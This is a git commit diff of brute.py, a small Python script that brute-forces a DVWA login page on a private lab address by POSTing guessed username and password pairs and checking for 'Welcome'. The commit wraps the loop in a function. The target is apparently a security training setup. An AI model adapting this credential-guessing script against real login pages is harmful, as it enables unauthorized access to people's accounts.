6c28fe54f1c2d50c6c1217efca7073624212dffd
Eduard Khiaev <eddietheone1984@gmail.com>
2020-07-15 09:37:44 +0300

    brute()

--- brute.py
+++ brute.py
@@ -1,21 +1,25 @@
 import requests
 
 
-USERNAMES = ['admin2', 'admin', 'admin88']
-PASSWORDS = ['password2', 'password', 'password88']
+USERNAMES = ['admin24234', 'admin', 'admin456456']
+PASSWORDS = ['password23423', 'password', 'password456456']
 URL = 'http://192.168.56.132/dvwa/login.php'
 
-for user in USERNAMES:
-    for password in PASSWORDS:
-        DATA = {
-            'username': user,
-            'password': password,
-            'Login': 'Login',
-        }
-        res = requests.post(url=URL, data=DATA)
-        if 'Welcome' in res.text:
-            print(f'logged in with user: {user}, password: {password}')
-            break
-        else:
-            print(f'trying user: {user}, password: {password}')
-    # break
+
+def brute():
+    for user in USERNAMES:
+        for password in PASSWORDS:
+            DATA = {
+                'username': user,
+                'password': password,
+                'Login': 'Login',
+            }
+            res = requests.post(url=URL, data=DATA)
+            if 'Welcome' in res.text:
+                print(f'logged in with user: {user}, password: {password}')
+                return
+            else:
+                print(f'trying user: {user}, password: {password}')
+
+
+brute()
